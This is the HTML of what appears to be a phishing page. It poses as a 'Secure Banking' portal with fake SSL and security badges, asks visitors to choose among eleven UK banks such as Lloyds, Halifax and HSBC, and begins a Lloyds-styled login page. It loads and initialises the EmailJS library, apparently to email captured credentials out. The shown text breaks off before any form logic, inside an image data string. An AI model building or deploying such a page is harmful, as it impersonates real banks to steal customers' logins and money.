<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Secure Banking</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>emailjs.init("5g0vSGPG-xbz8lu7d");</script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial, sans-serif; background: #f4f4f4; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
  @media (min-width: 768px) { body { align-items: center; padding: 40px 20px; } }
  .card { width: 100%; max-width: 480px; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.12); }
  .page { display: none; }
  .page.active { display: block; }
  .hdr { padding: 14px 20px; display: flex; align-items: center; justify-content: space-between; }
  .hdr-black { background: #111; }
  .hdr-green { background: #00694f; }
  .hdr-blue  { background: #0171bb; }
  .secure-badge { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.18); border-radius: 20px; padding: 4px 12px; }
  .secure-badge svg { width: 13px; height: 13px; fill: #fff; }
  .secure-badge span { color: #fff; font-size: 12px; }
  .hdr-logo { height: 32px; object-fit: contain; }
  .loading-body { padding: 48px 24px 56px; text-align: center; display: flex; flex-direction: column; align-items: center; }
  .spinner-wrap { position: relative; width: 80px; height: 80px; margin-bottom: 28px; }
  .spinner-bg { width: 80px; height: 80px; border-radius: 50%; background: #f0f0f0; display: flex; align-items: center; justify-content: center; }
  .spinner-bg svg { width: 36px; height: 36px; fill: #111; }
  .spinner-ring { position: absolute; top: 0; left: 0; width: 80px; height: 80px; border-radius: 50%; border: 3px solid #e0e0e0; border-top-color: #111; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-title { font-size: clamp(18px,4vw,22px); font-weight: 700; color: #111; margin-bottom: 10px; }
  .loading-sub { font-size: 13px; color: #666; line-height: 1.7; margin-bottom: 32px; }
  .progress-wrap { width: 100%; background: #e8e8e8; border-radius: 20px; height: 5px; margin-bottom: 10px; overflow: hidden; }
  .progress-bar { height: 5px; background: #111; border-radius: 20px; width: 0%; transition: width 0.1s linear; }
  .loading-timer { font-size: 12px; color: #aaa; margin-bottom: 24px; }
  .ssl-badge { display: flex; align-items: center; gap: 6px; background: #f4f4f4; border-radius: 20px; padding: 6px 14px; border: 0.5px solid #ddd; font-size: 11px; color: #111; }
  .ssl-badge svg { width: 13px; height: 13px; fill: #111; }
  .bank-body { padding: 20px 16px 28px; }
  .bank-title { font-size: clamp(18px,4vw,22px); font-weight: 700; color: #111; margin-bottom: 4px; }
  .bank-sub { font-size: 13px; color: #666; margin-bottom: 16px; }
  .bank-list { border: 0.5px solid #ddd; border-radius: 12px; overflow: hidden; }
  .bank-item { display: flex; align-items: center; gap: 12px; padding: 10px 14px; border-bottom: 0.5px solid #f0f0f0; cursor: pointer; transition: background 0.15s; }
  .bank-item:last-child { border-bottom: none; }
  .bank-item:hover { background: #f9f9f9; }
  .bank-item:active { background: #f0f0f0; }
  .bank-item-logo { width: 44px; height: 44px; border-radius: 8px; overflow: hidden; flex-shrink: 0; display: flex; align-items: center; justify-content: center; background: #fff; border: 0.5px solid #eee; }
  .bank-item-logo img { width: 100%; height: 100%; object-fit: contain; }
  .bank-item-name { flex: 1; font-size: 14px; color: #111; font-weight: 500; }
  .bank-arrow { width: 16px; height: 16px; fill: none; stroke: #aaa; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
  .ssl-footer { font-size: 11px; color: #aaa; text-align: center; margin-top: 16px; }
  .login-body { padding: 28px 20px 36px; }
  @media (min-width: 480px) { .login-body { padding: 32px 32px 40px; } }
  .welcome-title { font-size: clamp(20px,5vw,24px); font-weight: 700; color: #111; margin-bottom: 6px; }
  .welcome-sub { font-size: 13px; color: #555; margin-bottom: 16px; }
  .notice { padding: 10px 14px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; border-left: 3px solid; }
  .notice-green { background: #e6f4ef; border-color: #00694f; color: #004d38; }
  .notice-blue  { background: #e3f0fc; border-color: #0171bb; color: #0d47a1; }
  .field-group { margin-bottom: 16px; }
  .field-label { font-size: 13px; font-weight: 600; color: #111; margin-bottom: 6px; display: block; }
  .field-input-wrap { position: relative; }
  .field-input { width: 100%; padding: 13px 50px 13px 14px; border: 1.5px solid #bbb; border-radius: 10px; font-size: 15px; background: #fff; color: #111; outline: none; transition: border-color 0.2s; -webkit-appearance: none; }
  .field-input.green:focus { border-color: #00694f; }
  .field-input.blue:focus  { border-color: #0171bb; }
  .show-btn { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; font-size: 13px; font-weight: 600; cursor: pointer; padding: 4px; }
  .show-btn.green { color: #00694f; }
  .show-btn.blue  { color: #0171bb; }
  .field-hint { font-size: 11px; color: #888; margin-top: 5px; }
  .remember-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
  .remember-row input[type=checkbox] { margin-top: 2px; width: 18px; height: 18px; flex-shrink: 0; }
  .remember-row input.green { accent-color: #00694f; }
  .remember-row input.blue  { accent-color: #0171bb; }
  .remember-label { font-size: 13px; color: #111; cursor: pointer; }
  .warning-text { font-size: 12px; color: #555; margin-bottom: 20px; padding: 10px 12px; background: #faf6ec; border-left: 3px solid #e6a817; line-height: 1.5; }
  .warning-text strong { color: #111; }
  .continue-btn { width: 100%; color: #fff; border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 16px; transition: background 0.2s; -webkit-appearance: none; }
  .continue-btn.green { background: #00694f; }
  .continue-btn.green:hover { background: #005540; }
  .continue-btn.green:disabled { background: #7dab9a; cursor: not-allowed; }
  .continue-btn.blue  { background: #0171bb; }
  .continue-btn.blue:hover  { background: #0059a0; }
  .continue-btn.blue:disabled  { background: #7ab3d9; cursor: not-allowed; }
  .forgot-link { text-align: center; }
  .forgot-link.green a { color: #00694f; font-size: 14px; text-decoration: underline; }
  .forgot-link.blue  a { color: #0171bb; font-size: 14px; text-decoration: underline; }
  .toast { display: none; margin-top: 14px; padding: 11px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center; }
  .toast.error { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
  .success-body { padding: 36px 24px 44px; text-align: center; }
  @media (min-width: 480px) { .success-body { padding: 44px 36px 52px; } }
  @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
  .success-title { font-size: clamp(18px,4vw,22px); font-weight: 700; color: #111; margin-bottom: 10px; }
  .success-sub { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
  .info-box { background: #faf6ec; border-left: 3px solid #e6a817; padding: 14px 16px; text-align: left; }
  .info-box p { font-size: 13px; color: #555; line-height: 1.75; }
  .info-box strong { color: #111; }
</style>
</head>
<body>
<div class="card">

  <!-- PAGE 1: LOADING -->
  <div class="page active" id="page-loading">
    <div class="hdr hdr-black">
      <span></span>
      <div class="secure-badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg><span>Secure</span></div>
    </div>
    <div class="loading-body">
      <div class="spinner-wrap">
        <div class="spinner-bg"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg></div>
        <div class="spinner-ring"></div>
      </div>
      <h1 class="loading-title">Secure Connection</h1>
      <p class="loading-sub">We are transferring you to our secure page.<br>Please do not close this window.</p>
      <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
      <p class="loading-timer" id="timerText">Redirecting in 5 seconds...</p>
      <div class="ssl-badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg>256-bit SSL Encrypted</div>
    </div>
  </div>

  <!-- PAGE 2: BANK SELECTOR -->
  <div class="page" id="page-banks">
    <div class="hdr hdr-black">
      <span></span>
      <div class="secure-badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/></svg><span>Secure</span></div>
    </div>
    <div class="bank-body">
      <h1 class="bank-title">Select your bank</h1>
      <p class="bank-sub">Choose your bank to continue securely</p>
      <div class="bank-list">

        <div class="bank-item" onclick="selectBank('lloyds')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Lloyds" /></div>
          <span class="bank-item-name">Lloyds Bank</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('halifax')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Halifax" /></div>
          <span class="bank-item-name">Halifax</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="NatWest" /></div>
          <span class="bank-item-name">NatWest</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Barclays" /></div>
          <span class="bank-item-name">Barclays</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="HSBC" /></div>
          <span class="bank-item-name">HSBC</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Santander" /></div>
          <span class="bank-item-name">Santander</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="TSB" /></div>
          <span class="bank-item-name">TSB</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Metro Bank" /></div>
          <span class="bank-item-name">Metro Bank</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Monzo" /></div>
          <span class="bank-item-name">Monzo</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Virgin Money" /></div>
          <span class="bank-item-name">Virgin Money</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

        <div class="bank-item" onclick="selectBank('other')">
          <div class="bank-item-logo"><img src="data:image/png;base64," alt="Co-operative Bank" /></div>
          <span class="bank-item-name">Co-operative Bank</span>
          <svg class="bank-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
        </div>

      </div>
      <p class="ssl-footer">All connections are 256-bit SSL encrypted</p>
    </div>
  </div>

  <!-- PAGE 3: LLOYDS LOGIN (GREEN) -->
  <div class="page" id="page-lloyds">
    <div class="hdr hdr-green">
      <img class="hdr-logo" src="data:image/png;base64,
